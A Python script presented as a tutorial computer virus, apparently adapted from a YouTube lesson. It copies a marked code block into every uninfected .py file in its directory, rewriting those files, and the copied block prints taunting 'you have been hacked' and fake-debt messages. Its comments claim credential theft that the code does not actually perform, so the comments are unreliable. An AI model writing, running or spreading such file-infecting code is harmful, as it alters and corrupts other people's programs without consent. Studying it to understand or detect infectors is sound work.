#!/usr/bin/env python

# This program will not only infect any python files within the same directory,
# but it will also try to steal the user's information when they type in
# their information.
# (Portions of this mini tutorial program is based on a Youtube tutorial
# "Creating a Virus in Python" by "NetSecProf",
# https://www.youtube.com/watch?v=RJHPGYz2lA4)

import sys, glob, re

# Get a copy of the virus
vCode = []

# Open up this particular file
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()

# We are not in the virus at the moment...
inVirus = False

for line in lines:
    # When we find where the attack begins, we start appending each line
    if (re.search("^##### VIRUS BEGIN #####", line)): inVirus = True
    if(inVirus): vCode.append(line)
    if(re.search("^##### VIRUS END #####", line)): break

# Find potential victims
progs = glob.glob("*.py")

# Check and infect
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if("##### VIRUS BEGIN #####" in line):
            infected = True
            break
    if not infected:
        newCode = []
        if("#!" in pCode[0]): newCode.append(pCode.pop(0))
        # Allow the user to type in their credentials
        newCode.extend(pCode)

        # Insert virus code for total damage
        newCode.extend(vCode)

        # Writing new virus infected code
        fh = open(prog, "w")
        fh.writelines(newCode)
        fh.close()

usrname = "(Random User)"
pay = -50000

# Optional payload
##### VIRUS BEGIN #####
print(usrname + ", you have been hacked! All your files and items now belong to me! Muahahahahaha")
print("You have given me $", pay, "! It's all mine!")
pay -= pay + 50000
print("Your new pay is now $", pay, ", which means you owe me!")

##### VIRUS END #####